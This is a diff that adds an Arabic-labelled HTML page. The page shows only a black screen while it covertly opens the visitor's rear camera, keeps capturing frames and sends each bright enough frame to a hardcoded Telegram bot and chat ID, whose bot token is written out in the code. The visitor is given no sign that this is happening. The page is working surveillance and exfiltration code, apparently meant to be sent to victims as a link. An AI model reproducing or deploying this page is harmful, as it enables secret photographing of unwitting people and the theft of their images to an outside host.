@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>كاميرا ذكية - إرسال صور</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: black;
+      overflow: hidden;
+    }
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+  const botToken = '7611972370:AAGPrp4EL-CqBbc9AHkbQNemaDMqzBcKziM';
+  const chatId = '6305469091';
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+  const ctx = canvas.getContext('2d');
+
+  async function startCamera() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "environment" },
+        audio: false
+      });
+
+      video.srcObject = stream;
+
+      video.addEventListener('loadedmetadata', () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+
+        // أول محاولة فورًا
+        captureAndSendLoop();
+      });
+
+    } catch (err) {
+      console.error("فشل الوصول إلى الكاميرا:", err);
+    }
+  }
+
+  function captureAndSendLoop() {
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+
+    let brightnessSum = 0;
+    const totalPixels = data.length / 4;
+
+    for (let i = 0; i < data.length; i += 4) {
+      const r = data[i];
+      const g = data[i + 1];
+      const b = data[i + 2];
+      const brightness = (r + g + b) / 3;
+      brightnessSum += brightness;
+    }
+
+    const avgBrightness = brightnessSum / totalPixels;
+    console.log("سطوع متوسط:", avgBrightness);
+
+    if (avgBrightness > 40) {
+      canvas.toBlob(blob => {
+        sendToTelegram(blob).then(() => {
+          // بعد الإرسال، التقط صورة جديدة مباشرة
+          requestAnimationFrame(captureAndSendLoop);
+        });
+      }, 'image/jpeg', 0.95);
+    } else {
+      console.warn("صورة مظلمة جداً - تم تجاهلها");
+      // جرّب التقاط صورة جديدة مباشرة
+      requestAnimationFrame(captureAndSendLoop);
+    }
+  }
+
+  async function sendToTelegram(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('photo', blob, 'image.jpg');
+
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (res.ok) {
+        console.log("تم إرسال الصورة بنجاح");
+      } else {
+        console.error("فشل الإرسال:", res.statusText);
+      }
+    } catch (err) {
+      console.error("خطأ أثناء الإرسال:", err);
+    }
+  }
+
+  window.onload = () => {
+    startCamera();
+  };
+</script>
+
+</body>
+</html>
